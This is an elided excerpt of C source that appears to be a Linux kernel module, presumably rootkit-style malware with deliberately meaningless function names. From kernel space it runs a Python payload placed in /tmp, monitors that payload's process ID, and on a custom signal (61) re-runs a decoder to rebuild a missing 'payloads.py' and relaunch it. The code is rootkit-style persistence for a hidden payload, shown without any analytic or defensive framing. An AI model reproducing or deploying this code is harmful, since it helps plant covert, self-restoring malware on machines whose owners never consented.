...
int jdkepflfks(void){
    ...
    char *argv[] = { "/bin/bash", "-c", "exec python3 /tmp/hsjajsnsjd.py", NULL };
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    int ret;
    ...
    if (ret == 0) {
        ...
        while ((shajshejxn == -1) || (processcheckercount == 20)){
            ssleep(2);
            idjehsndhs();
            processcheckercount++;
    ...
    if (sig == 61) {
        if (shajshejxn == -1) {
            if (!ldksjeushd(HAJSNEJDNF)) {
                uehsjdnshd();
                printk(KERN_INFO "mob: [INFO] payloads.py not found, re-running decoder\n");
                printk(KERN_INFO "mob: [INFO] 1 Payload PID: %d not found!\n", shajshejxn);
            }
            jdkepflfks();
            printk(KERN_INFO "mob: [INFO] 2 Payload PID: %d\n", shajshejxn);
        } else {
            uwhanslajs();
